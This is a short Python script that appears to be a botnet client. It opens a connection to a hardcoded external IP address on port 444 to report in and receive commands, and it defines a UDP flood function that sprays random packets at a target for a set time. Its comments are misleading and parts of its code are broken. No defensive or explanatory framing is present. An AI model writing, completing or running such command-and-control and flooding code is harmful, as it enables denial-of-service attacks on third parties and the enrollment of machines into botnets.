import socket, random

# create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# get local machine name
host = "194.87.69.171"                          

port = 444


def UDP_Attack(ip, port, time):
    qClock = (lambda:0, time.clock)[time > 0]
    time = (1, (qClock() + time))[time > 0]
    qPacket = random._urandom(port)
    qSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
	    if (qClock() < time):
		    qPort = random.randint(1, 65535)
		    qSocket.sendto(qPacket, (ip, port))
	    else:
		    break
    

# connection to hostname on the port.
s.connect((host, port))                               

# Receive no more than 1024 bytes
s.send("working\r\n".encode())
while(True):
    tm = s.recv(1024)
    print(tm)
    if tm == "ping":
        s.send("ping".encode())
    s.close()

print("The time got from the server is %s" % tm.decode('ascii'))
